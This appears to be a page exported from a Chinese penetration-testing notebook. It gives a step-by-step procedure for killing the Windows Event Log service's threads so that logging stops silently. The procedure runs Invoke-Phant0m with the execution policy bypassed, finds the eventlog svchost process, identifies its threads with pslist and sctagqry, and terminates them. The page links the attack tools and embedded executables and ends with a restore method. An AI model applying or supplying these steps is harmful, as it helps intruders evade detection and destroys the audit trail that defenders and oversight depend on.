<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>关闭日志记录线程</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>关闭日志记录线程</h1><br/><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\224-Invoke-Phant0m.ps1">Linked file: Invoke-Phant0m.ps1 </a></td></tr></table><br /><br />powershell -executionpolicy bypass -file Invoke-Phant0m.ps1<br /><br /><a href="https://github.com/hlldz/Invoke-Phant0m">https://github.com/hlldz/Invoke-Phant0m</a><br /><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/</a><br /><br />1、 定位eventlog服务对应进程svchost.exe的pid<br />Get-WmiObject -Class win32_service -Filter &quot;name = &#39;eventlog&#39;&quot; | select -exp ProcessId<br />2、 遍历该进程中的所有线程<br /><a href="https://technet.microsoft.com/en-us/sysinternals/bb896682.aspx">https://technet.microsoft.com/en-us/sysinternals/bb896682.aspx</a><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\224-pslist64.exe">Linked file: pslist64.exe </a></td></tr></table><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\224-pslist.exe">Linked file: pslist.exe </a></td></tr></table><br />pslist.exe /accepteula -d 7008<br />(上面查出来的进程ID)<br />3、 判断线程是否满足条件<br /><a href="http://www.winsiderss.com/tools/sctagquery/sctagqry.zip">www.winsiderss.com/tools/sctagquery/sctagqry.zip</a><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\224-sctagqry_amd64.exe">Linked file: sctagqry_amd64.exe </a></td></tr></table><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\224-sctagqry_i386.exe">Linked file: sctagqry_i386.exe </a></td></tr></table><br />sctagqry.exe -t 7928<br />依次查询上面的线程ID，找出所有service tag为eventlog的线程，结束线程<br /><br />Windows Event Log 服务需要调用wevtsvc.dll，完整路径为%WinDir%\System32\wevtsvc.dll<br />并且，如果线程调用了wevtsvc.dll，就可以判读该线程实现了日志记录功能<br /><br />4、 结束线程<br /><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass">https://github.com/3gstudent/Windwos-EventLog-Bypass</a><br />使用TerminateThread<br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\224-TerminateThread.exe">Linked file: TerminateThread.exe </a></td></tr></table><br /><br />TerminateThread pid1 pid2 pid3 pid4 ...<br /><br /><br />5、 恢复方法<br /><br />结束进程svchost.exe<br /><br />重新开启Windows Event Log 服务：<br /><br />net start eventlog<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>